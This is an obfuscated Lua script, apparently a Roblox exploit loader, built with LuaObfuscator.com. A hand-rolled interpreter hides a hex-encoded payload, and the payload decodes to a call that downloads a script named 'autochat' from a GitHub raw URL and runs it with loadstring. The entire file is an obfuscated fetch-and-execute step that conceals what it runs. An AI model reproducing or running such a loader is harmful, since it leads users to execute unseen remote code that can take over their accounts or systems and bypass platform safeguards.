--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v85=0;while true do if (v85==0) then v19=v0(v3(v30,1,1));return "";end end else local v86=0;local v87;while true do if (v86==0) then v87=v2(v0(v30,16));if v19 then local v124=v5(v87,v19);v19=nil;return v124;else return v87;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v88=0;local v89;while true do if (v88==0) then v89=(v31/((5 -3)^(v32-(2 -1))))%((3 -(878 -(282 + 595)))^(((v33-1) -(v32-(2 -1))) + (620 -((2192 -(1523 + 114)) + 64)))) ;return v89-(v89%((838 + 94) -(857 + (105 -31)))) ;end end else local v90=(570 -((1432 -(68 + 997)) + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v90 + v90))>=v90) and ((1271 -(226 + 1044)) + 0)) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + (8 -6) ;return (v36 * (373 -(32 + 85))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 + 0 );v18=v18 + 1 + 3 ;return (v40 * (16778173 -((1637 -745) + (415 -(87 + 263))))) + (v39 * (156337 -90801)) + (v38 * (472 -216)) + v37 ;end local function v24() local v41=0 -0 ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(181 -(67 + 113))) then v44=1 + 0 ;v45=(v20(v43,2 -1 ,20) * ((2 + 0)^(127 -95))) + v42 ;v41=954 -(802 + 150) ;end if (((3 + 2) -3)==v41) then v46=v20(v43,37 -16 ,23 + (13 -5) );v47=((v20(v43,1029 -(915 + 82) )==(2 -1)) and  -1) or (1 + 0) ;v41=3 -0 ;end if (v41==((1625 -(145 + 293)) -(1069 + 118))) then v42=v23();v43=v23();v41=1;end if (v41==(6 -3)) then if (v46==(0 -(430 -(44 + 386)))) then if (v45==(0 + 0)) then return v47 * (0 -0) ;else v46=1 + 0 ;v44=791 -(368 + (1909 -(998 + 488))) ;end elseif (v46==2047) then return ((v45==(0 -0)) and (v47 * ((19 -(10 + 8))/0))) or (v47 * NaN) ;end return v8(v47,v46-((1250 + 2684) -2911) ) * (v44 + (v45/(2^(494 -(416 + 22 + 4))))) ;end end end local function v25(v48) local v49=0;local v50;local v51;while true do if ((774 -(72 + 129 + 571))==v49) then v51={};for v112=1139 -(116 + 1022) , #v50 do v51[v112]=v2(v1(v3(v50,v112,v112)));end v49=12 -9 ;end if (v49==((887 -(261 + 624)) + 1)) then return v6(v51);end if (v49==0) then v50=nil;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=3 -2 ;end if (v49==(860 -(814 + 45))) then v50=v3(v16,v18,(v18 + v48) -(2 -1) );v18=v18 + v48 ;v49=1 + 1 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do if (v91== #"}") then if (v92== #"~") then v93=(function() return v94()~=(0 -0) ;end)();elseif (v92==2) then v93=(function() return v95();end)();elseif (v92== #"gha") then v93=(function() return v96();end)();end v97[v98]=(function() return v93;end)();break;end if (v91~=(0 -0)) then else local v119=(function() return 0;end)();local v120=(function() return;end)();while true do if (v119==0) then v120=(function() return 0 -0 ;end)();while true do if (v120==1) then v91=(function() return  #"~";end)();break;end if (v120==(285 -(134 + 151))) then v92=(function() return v94();end)();v93=(function() return nil;end)();v120=(function() return 1666 -(970 + 695) ;end)();end end break;end end end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v53=(function() return function(v99,v100,v101) local v102=(function() return 0 -0 ;end)();local v103=(function() return;end)();while true do if ((1990 -(582 + 1408))~=v102) then else v103=(function() return 0;end)();while true do if (v103==(0 -0)) then local v125=(function() return 0;end)();local v126=(function() return;end)();while true do if (v125==0) then v126=(function() return 0;end)();while true do if (v126==0) then v99[v100-#"!" ]=(function() return v101();end)();return v99,v100,v101;end end break;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v67= #"[",v58 do FlatIdent_5ED46,Type,Cons,v21,v24,v25,v59,v67=(function() return v52(FlatIdent_5ED46,Type,Cons,v21,v24,v25,v59,v67);end)();end v57[ #"xxx"]=(function() return v21();end)();for v68= #"[",v23() do local v69=(function() return v21();end)();if (v20(v69, #"{", #"<")==0) then local v107=(function() return 0 -0 ;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();local v111=(function() return;end)();while true do if (v107~=1) then else local v121=(function() return 0;end)();while true do if (v121==(3 -2)) then v107=(function() return 1826 -(1195 + 629) ;end)();break;end if (v121==0) then v110=(function() return nil;end)();v111=(function() return nil;end)();v121=(function() return 1 -0 ;end)();end end end if (v107==(241 -(187 + 54))) then local v122=(function() return 0;end)();local v123=(function() return;end)();while true do if (v122==(780 -(162 + 618))) then v123=(function() return 0 + 0 ;end)();while true do if (v123~=(1 + 0)) then else v107=(function() return 1 -0 ;end)();break;end if (v123==0) then v108=(function() return 0;end)();v109=(function() return nil;end)();v123=(function() return 1;end)();end end break;end end end if (v107~=2) then else while true do if (v108== #">") then local v127=(function() return 0 -0 ;end)();local v128=(function() return;end)();while true do if (v127~=0) then else v128=(function() return 0;end)();while true do if ((1 + 0)==v128) then v108=(function() return 1638 -(1373 + 263) ;end)();break;end if (v128==0) then v111=(function() return {v22(),v22(),nil,nil};end)();if (v109==(1000 -(451 + 549))) then local v178=(function() return 0;end)();local v179=(function() return;end)();while true do if (v178==0) then v179=(function() return 0;end)();while true do if ((0 + 0)~=v179) then else v111[ #"-19"]=(function() return v22();end)();v111[ #"?id="]=(function() return v22();end)();break;end end break;end end elseif (v109== #"\\") then v111[ #"19("]=(function() return v23();end)();elseif (v109==2) then v111[ #"19("]=(function() return v23() -((2 -0)^(26 -10)) ;end)();elseif (v109== #"xxx") then local v186=(function() return 0;end)();local v187=(function() return;end)();while true do if (v186~=0) then else v187=(function() return 0;end)();while true do if (v187==0) then v111[ #"xnx"]=(function() return v23() -(2^(1400 -(746 + 638))) ;end)();v111[ #"http"]=(function() return v22();end)();break;end end break;end end end v128=(function() return 1 + 0 ;end)();end end break;end end end if (v108~=(2 -0)) then else local v129=(function() return 0;end)();local v130=(function() return;end)();while true do if (v129~=0) then else v130=(function() return 0;end)();while true do if (v130~=(341 -(218 + 123))) then else if (v20(v110, #"}", #",")~= #"!") then else v111[1583 -(1535 + 46) ]=(function() return v59[v111[2 + 0 ]];end)();end if (v20(v110,2,2)== #"|") then v111[ #"-19"]=(function() return v59[v111[ #"gha"]];end)();end v130=(function() return 1 + 0 ;end)();end if (v130==1) then v108=(function() return  #"xxx";end)();break;end end break;end end end if (v108== #"-19") then if (v20(v110, #"xxx", #"91(")== #"|") then v111[ #"asd1"]=(function() return v59[v111[ #"xnxx"]];end)();end v54[v68]=(function() return v111;end)();break;end if (v108==(560 -(306 + 254))) then local v132=(function() return 0 + 0 ;end)();local v133=(function() return;end)();while true do if (v132==(0 -0)) then v133=(function() return 0;end)();while true do if (v133~=1) then else v108=(function() return  #"}";end)();break;end if (v133==(1467 -(899 + 568))) then v109=(function() return v20(v69,2 + 0 , #"xxx");end)();v110=(function() return v20(v69, #"asd1",14 -8 );end)();v133=(function() return 604 -(268 + 335) ;end)();end end break;end end end end break;end end end end for v70= #"/",v23() do v55,v70,v28=(function() return v53(v55,v70,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[291 -((1272 -(323 + 889)) + 230) ];local v65=v61[5 -3 ];local v66=v61[583 -(361 + 219) ];return function(...) local v71=v64;local v72=v65;local v73=v66;local v74=v27;local v75=573 -(426 + 146) ;local v76= -1;local v77={};local v78={...};local v79=v12("#",...) -(1457 -(282 + 1174)) ;local v80={};local v81={};for v104=811 -(569 + 242) ,v79 do if (v104>=v73) then v77[v104-v73 ]=v78[v104 + 1 ];else v81[v104]=v78[v104 + 1 ];end end local v82=(v79-v73) + (2 -1) ;local v83;local v84;while true do v83=v71[v75];v84=v83[1 + 0 ];if ((v84<=(1031 -(706 + 318))) or (3275==1804)) then if (v84<=(1254 -(721 + 530))) then if (v84<=(321 -(53 + 267))) then if (v84==(1271 -(945 + 326))) then local v134=0 -0 ;local v135;local v136;while true do if (v134==(1 + 0)) then v81[v135 + (701 -(62 + 209 + 429)) ]=v136;v81[v135]=v136[v83[(417 -(15 + 398)) + 0 ]];break;end if ((3912==3912) and (v134==((2482 -(18 + 964)) -(1408 + 92)))) then v135=v83[2];v136=v81[v83[3]];v134=1087 -(461 + (2352 -1727)) ;end end else v81[v83[1290 -(993 + 295) ]]=v63[v83[1 + 2 ]];end elseif (v84==(1173 -(418 + 753))) then local v139=v83[1 + 1 ];v81[v139]=v81[v139](v13(v81,v139 + 1 ,v76));else local v141=v83[1 + 0 + 1 ];local v142,v143=v74(v81[v141](v13(v81,v141 + 1 + 0 ,v83[1 + 2 ])));v76=(v143 + v141) -(530 -(406 + 123)) ;local v144=1769 -(1102 + 647 + 20) ;for v165=v141,v76 do local v166=0;while true do if ((v166==(0 + (850 -(20 + 830)))) or (1417>3629)) then v144=v144 + (1323 -(1249 + 73)) ;v81[v165]=v142[v144];break;end end end end elseif (v84<=5) then if (v84>(2 + 2)) then v81[v83[2]]=v83[1148 -(466 + 679) ];else do return;end end elseif ((2821<=4824) and (v84>(14 -8))) then local v147=v83[(4 + 1) -3 ];local v148=v81[v83[3]];v81[v147 + 1 ]=v148;v81[v147]=v148[v83[4]];else v81[v83[1902 -(106 + (1920 -(116 + 10))) ]]={};end elseif (v84<=(4 + 7)) then if ((1738<=2195) and (4795>402) and (v84<=(3 + 6))) then if ((41<=3018) and (v84==(23 -15))) then local v153=v83[(1 + 4) -3 ];local v154,v155=v74(v81[v153](v13(v81,v153 + (115 -(4 + 110)) ,v83[587 -((795 -(542 + 196)) + 527) ])));v76=(v155 + v153) -((3061 -1633) -(41 + 1386)) ;local v156=103 -(17 + 86) ;for v167=v153,v76 do v156=v156 + 1 + 0 ;v81[v167]=v154[v156];end else local v157=v83[3 -1 ];v81[v157]=v81[v157](v13(v81,v157 + ((1 + 1) -1) ,v76));end elseif (v84==(176 -(122 + 44))) then do return;end else v81[v83[2 -0 ]]();end elseif ((2145<=4104) and (v84<=(43 -30))) then if ((2689<4845) and (4813>3565) and (v84>(10 + 2))) then v81[v83[2]]();else v81[v83[2]]=v63[v83[1 + 2 ]];end elseif (v84==(27 -13)) then v81[v83[(35 + 32) -(30 + 35) ]]=v83[3 + 0 ];else v81[v83[1259 -(1043 + 214) ]]={};end v75=v75 + ((2 + 1) -2) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403553Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F44756331382D636F64652F64756373686172656C696E6B6875622F726566732F68656164732F6D61696E2F6175746F6368617400094Q00067Q001201000100013Q001201000200023Q00202Q000200020003001205000400044Q0003000200044Q000900013Q00022Q000B0001000100012Q00043Q00017Q00",v9(),...);